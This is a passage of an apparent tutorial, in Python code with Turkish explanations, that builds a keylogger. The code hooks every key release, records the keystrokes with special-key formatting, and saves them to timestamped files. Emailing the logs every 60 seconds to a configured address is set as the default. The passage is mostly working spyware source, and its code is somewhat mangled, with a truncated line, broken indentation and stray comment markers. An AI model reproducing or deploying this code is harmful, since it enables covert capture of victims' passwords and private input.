import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"
// SEND_REPORT_EVERY'yi 60 olarak ayarlamak, tuş kayıtlarımızı her 60 saniyede bir (yani bir dakika) raporladığımız anlamına gelir. İhtiyaçlarınıza göre bunu düzenlemekte özgürsünüz.
Bir tuş kaydedicisini en iyi şekilde temsil etmenin yolu, onun için bir sınıf oluşturmaktır ve bu sınıftaki her bir yöntem belirli bir görevi yerine getirir:
//

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now(
//Varsayılan olarak report_method'u "email" olarak ayarladık, bu da tuş kayıtlarını e-postamıza göndereceğimizi gösterir. Daha sonra "file" şeklinde geçtiğimizde bunun nasıl bir yerel dosyaya kaydedileceğini göreceksiniz.
Şimdi, her KEY_UP olayı (klavyede bir tuşu bıraktığınızda) için çağrılacak bir geri çağırma alanı olan keyboard modülünün on_release() fonksiyonunu kullanmamız gerekecek. Bu geri çağırma alanı, bir tane parametre olan KeyboardEvent'e sahiptir ve bu parametre name özniteliğine sahiptir
//
def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
